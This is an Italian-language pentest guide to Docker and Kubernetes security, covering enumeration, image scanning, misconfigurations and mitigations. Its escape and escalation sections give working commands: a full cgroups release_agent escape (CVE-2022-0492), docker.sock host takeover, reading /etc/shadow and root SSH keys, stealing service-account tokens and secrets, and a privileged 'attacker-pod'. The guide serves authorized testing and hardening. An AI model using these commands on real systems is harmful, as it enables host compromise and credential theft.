# Container Security

## Scopo

Questa guida copre vulnerabilità e tecniche di testing per ambienti containerizzati (Docker, Kubernetes), inclusi escape, misconfigurations e supply chain attacks.

## Prerequisiti

- Docker installato
- Accesso a cluster Kubernetes (opzionale)
- Trivy, Falco o tool simili
- **Autorizzazione per testing**

## Installazione

```bash
# Docker
sudo apt-get install docker.io

# Trivy (vulnerability scanner)
sudo apt-get install trivy

# kubectl
sudo apt-get install kubectl
```

---

## Docker Security

### Container Enumeration

```bash
# Lista container
docker ps -a

# Inspect
docker inspect CONTAINER_ID

# Verifica privilegi
docker inspect --format='{{.HostConfig.Privileged}}' CONTAINER_ID

# Capabilities
docker inspect --format='{{.HostConfig.CapAdd}}' CONTAINER_ID
```

### Image Analysis

```bash
# Scan vulnerabilità
trivy image IMAGE:TAG

# History
docker history IMAGE

# Dockerfile extraction
docker image inspect IMAGE --format='{{.Config.Cmd}}'
```

---

## Container Escape

### Privileged Container

```bash
# Se container è privileged
cat /proc/1/cgroup | grep docker

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Accedi a host
chroot /mnt/host
```

### Docker Socket Mounted

```bash
# Verifica
ls -la /var/run/docker.sock

# Se presente, controllo completo
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
```

### Sensitive Mounts

```bash
# /etc, /root, etc montati
cat /host/etc/shadow

# SSH keys
cat /host/root/.ssh/id_rsa
```

### Kernel Exploits

```bash
# Se kernel vulnerabile
# CVE-2022-0185, Dirty Pipe (CVE-2022-0847)

# Verifica versione
uname -r

# Cerca exploit
```

### cgroups Escape

```bash
# CVE-2022-0492
# Release_agent escape

mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/child
echo 1 > /tmp/cgrp/child/notify_on_release
host_path=$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/child/cgroup.procs"
cat /output
```

---

## Kubernetes Security

### Reconnaissance

```bash
# Service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# API server
env | grep KUBERNETES
```

### API Access

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# List pods
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/pods

# Get secrets
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/secrets
```

### RBAC Enumeration

```bash
# Con kubectl
kubectl auth can-i --list

# Specifico
kubectl auth can-i create pods
kubectl auth can-i get secrets

# Tutti i namespaces
kubectl auth can-i --list --all-namespaces
```

### Privilege Escalation

```bash
# Se puoi creare pods
# Crea pod privilegiato

cat << EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
spec:
  containers:
  - name: attacker
    image: alpine
    command: ["/bin/sh", "-c", "sleep infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-volume
  volumes:
  - name: host-volume
    hostPath:
      path: /
EOF

kubectl exec -it attacker-pod -- chroot /host
```

---

## Image Vulnerabilities

### Trivy

```bash
# Scan image
trivy image nginx:latest

# Severity filter
trivy image --severity HIGH,CRITICAL nginx:latest

# Output JSON
trivy image -f json -o results.json nginx:latest
```

### Grype

```bash
# Alternativa a Trivy
grype IMAGE:TAG
```

### Dockerfile Best Practices

```dockerfile
# Usa immagini base minimali
FROM alpine:latest

# Non root
RUN adduser -D appuser
USER appuser

# No secrets in build
# Usa secrets at runtime

# Multi-stage build
FROM golang as builder
RUN go build -o app
FROM alpine
COPY --from=builder /app /app
```

---

## Supply Chain

### Image Verification

```bash
# Docker Content Trust
export DOCKER_CONTENT_TRUST=1
docker pull IMAGE

# Cosign (sigstore)
cosign verify IMAGE
```

### Base Image Audit

```bash
# Verifica provenienza
docker inspect IMAGE | jq '.[0].Config.Labels'

# Parent image
docker image inspect --format='{{.Parent}}' IMAGE
```

---

## Runtime Security

### Falco

```bash
# Real-time threat detection
# Regole per comportamenti anomali

# Installazione
helm install falco falcosecurity/falco

# Log anomalie
kubectl logs -l app=falco
```

### Sysdig

```bash
# Container visibility
sysdig -c spy_users

# Filter per container
sysdig container.name=nginx
```

---

## Misconfigurations

### Docker

```yaml
# docker-compose.yml - problemi comuni

services:
  app:
    privileged: true           # Evita
    cap_add:
      - ALL                    # Troppi permessi
    volumes:
      - /:/host                # Mount root
      - /var/run/docker.sock:/var/run/docker.sock  # Socket access
    network_mode: host         # No isolation
    pid: host                  # Host PID namespace
```

### Kubernetes

```yaml
# Pod spec - problemi comuni

spec:
  containers:
  - name: app
    securityContext:
      privileged: true         
      runAsUser: 0            # root
      allowPrivilegeEscalation: true  
    
  hostNetwork: true            
  hostPID: true               
  hostIPC: true               
```

---

## Tools

| Tool | Uso |
|------|-----|
| Trivy | Vulnerability scan |
| Falco | Runtime security |
| kube-hunter | K8s pen testing |
| kube-bench | CIS benchmark |
| Kubescape | Security scanning |
| Docker Bench | Docker CIS |

### kube-hunter

```bash
# Scan cluster
kube-hunter --remote TARGET

# Attivo
kube-hunter --active
```

### kube-bench

```bash
# CIS Kubernetes Benchmark
kube-bench run --targets master
kube-bench run --targets node
```

---

## Mitigazioni

### Docker

```bash
# Usa user namespace
dockerd --userns-remap=default

# Read-only filesystem
docker run --read-only IMAGE

# Drop capabilities
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE IMAGE

# Seccomp/AppArmor
docker run --security-opt seccomp=profile.json IMAGE
```

### Kubernetes

```yaml
# Pod Security Standards
apiVersion: v1
kind: Pod
spec:
  securityContext:
    runAsNonRoot: true
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
```

---

## Best Practices

- **Minimal base**: Usa distroless o alpine
- **Non-root**: Mai run as root
- **Immutable**: Read-only filesystem
- **Scan**: CI/CD vulnerability scanning
- **Runtime**: Monitoring comportamentale

## Riferimenti

- [Docker Security](https://docs.docker.com/engine/security/)
- [Kubernetes Security](https://kubernetes.io/docs/concepts/security/)
- [CIS Benchmarks](https://www.cisecurity.org/benchmark/docker)
- [OWASP Container Security](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
